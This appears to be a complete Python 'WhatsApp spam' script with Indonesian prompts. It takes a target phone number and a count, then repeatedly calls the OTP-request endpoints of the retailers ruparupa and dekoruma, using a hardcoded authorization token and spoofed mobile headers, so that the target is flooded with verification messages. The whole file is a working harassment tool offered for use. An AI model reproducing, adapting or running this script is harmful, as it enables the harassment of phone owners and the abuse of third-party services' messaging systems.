import requests, json, time
ua = 'Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 GSA/10.16.6.21.arm64'
r = requests.Session()
class gaguna:
 def tunggu(t):
  while t:
   wd=f'\r{w.i}----> [{w.m}#{w.i}] {w.h}Jeda selama {w.i}({w.p}'+str(t)+f'{w.i}) {w.h}detik '
   print(wd,end='\r',flush=True)
   time.sleep(1)
   t -= 1
class w:
 m = '\033[1;31m' # merah
 b = '\033[1;36m' # biru
 k = '\033[1;33m' # kuning
 h = '\033[1;32m' # hijau
 u = '\033[1;35m' # ungu
 p = '\033[1;37m' # putih
 i = '\033[1;90m' # abu abu
 ut = '\033[1;34m' # ungu tua
 tm = '\x1b[103m\x1b[31m' # tebal merah (background kuning)
 df = '\x1b[0m'
 c = '\033[1;96m' # cyan
class main:
 def banner():
     print (f"""{w.c}  ______                           ____      ____      
{w.k}.' ____ \                         |_  _|    |_  _|     
{w.c}| (___ \_|_ .--.   ,--.   _ .--..--.\ \  /\  / /,--.   
{w.k} _.____`.[ '/'`\ \`'_\ : [ `.-. .-. |\ \/  \/ /`'_\ :  
{w.c}| \____) || \__/ |// | |, | | | | | | \  /\  / // | |, 
{w.k} \______.'| ;.__/ \'-;__/[___||__||__] \/  \/  \'-;__/ 
{w.c}         [__|                                          """)
 def subbanner():
     print (f"""{w.i}[{w.k}-{w.i}] {w.k}Author {w.i}: {w.h}abilseno11
{w.i}[{w.k}-{w.i}] {w.k}Nama SC {w.i}: {w.h}Script Spam Wa
{w.i}[{w.k}-{w.i}] {w.k}Github {w.i}: {w.h}https://github.com/AbilSeno
{w.i}[{w.k}-{w.i}] {w.k}Pesan {w.i}: {w.h}Sementara gunakan spam dekoruma terlebih dahulu""")
 def start():
     pilih = input(f'{w.i}--> {w.i}[{w.m}-{w.i}] {w.k}Massukan pilihan : ')
     if (pilih == '1') or (pilih == '01'):
      main.ruparupa()
     elif (pilih == '2') or (pilih == '02'):
      main.dekoruma()
     else:
      print (f"{w.i}--> {w.i}[{w.m}-{w.i}] {w.m}Massukan pilihan dengan benar")
      main.start()
 def pilihan():
     print (f"""{w.i}[{w.c}01{w.i}] {w.h}Spam RupaRupa {w.i}({w.k}limit:1x30mnt{w.i})
{w.i}[{w.c}02{w.i}] {w.h}Spam Dekoruma {w.i}[{w.k}limit:5x24jam{w.i})""")
 def ruparupa():
     nom = input(f'{w.i}----> {w.i}[{w.m}-{w.i}] {w.k}Masukkan nomor target (contoh:888xx) : ')
     if len(nom) < 5:
      print (f"{w.i}----> {w.i}[{w.m}-{w.i}] {w.m}Massukan nomor dengan benar!!!")
      main.dekoruma()
     else:
      jum = int(input(f'{w.i}----> {w.i}[{w.m}-{w.i}] {w.k}Massukan jumlah spam (ex:5) : '))
      class data:
       ruparupa1 = json.dumps({"phone":"0"+nom,"email":"abilseno11@gmail.com","action":"register","password":""})
       ruparupa2 = json.dumps({"phone":"0"+nom,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0})
      for spam in range(jum):
         rupa1 = r.post(url.ruparupa1,headers=hd.ruparupa1,data=data.ruparupa1).text
         rupa2 = r.post(url.ruparupa2,headers=hd.ruparupa2,data=data.ruparupa2).text
         if 'error' in rupa2:
          print (f"{w.i}----> [{w.m}GAGAL{w.i}] {w.c}mengirim spam ke no {w.i}({w.u}{nom}{w.i})")
         else:
          print (f"{w.i}----> [{w.h}SUKSES{w.i}] {w.c}mengirim spam ke no {w.i}({w.u}{nom}{w.i})")
          gaguna.tunggu(60)
 def dekoruma():
      nom = input(f'{w.i}----> {w.i}[{w.m}-{w.i}] {w.k}Masukkan nomor target (contoh:888xx) : ')
      if len(nom) < 5:
       print (f"{w.i}----> {w.i}[{w.m}-{w.i}] {w.m}Massukan nomor dengan benar!!!")
       main.dekoruma()
      else:
       jum = int(input(f'{w.i}----> {w.i}[{w.m}-{w.i}] {w.k}Masukkan jumlah spam (ex:5) : '))
       class data:
        dekoruma = json.dumps({"phoneNumber":"+62"+nom,"platform":"wa"})
       for spam in range(jum):
        deko = r.post(url.dekoruma,headers=hd.dekoruma,data=data.dekoruma).text
        if '' in deko:
         print (f"{w.i}----> [{w.h}SUKSES{w.i}] {w.c}mengirim spam ke no {w.i}({w.u}{nom}{w.i})")
         gaguna.tunggu(60)
        else:
         print (f"{w.i}----> [{w.m}GAGAL{w.i}] {w.c}mengirim spam ke no {w.i}({w.u}{nom}{w.i})")
         gaguna.tunggu(60)
class url:
 ruparupa1 = 'https://wapi.ruparupa.com/auth/check-otp-auth'
 ruparupa2 = 'https://wapi.ruparupa.com/auth/generate-otp'
 dekoruma = 'https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json'
class hd:
 ruparupa1 = {
 'accept': 'application/json',
 'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
 'content-length': '88',
 'content-type': 'application/json',                                                                                                          'origin': 'https://m.ruparupa.com',
 'referer': 'https://m.ruparupa.com/my-account',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-site',
 'user-agent': ua,
 'user-platform': 'mobile',
 'x-company-name': 'odi',                                                                                                                     'x-frontend-type': 'mobile',
}
 ruparupa2 = {
 'accept': 'application/json',
 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
 'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
 'content-length': '103',
 'content-type': 'application/json',
 'origin': 'https://ruparupa.com',
 'referer': 'https://ruparupa.com/verification?page=otp-choices',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-site',
 'user-agent': ua,
 'user-platform': 'mobile',
 'x-company-name': 'odi',
 'x-frontend-type': 'mobile',
}
 dekoruma = {"content-type": "application/json","user-agent":ua}
if __name__ == '__main__':
 main.banner()
 main.subbanner()
 print (f"           {w.tm}MENU{w.df}       ")
 main.pilihan()
 main.start()
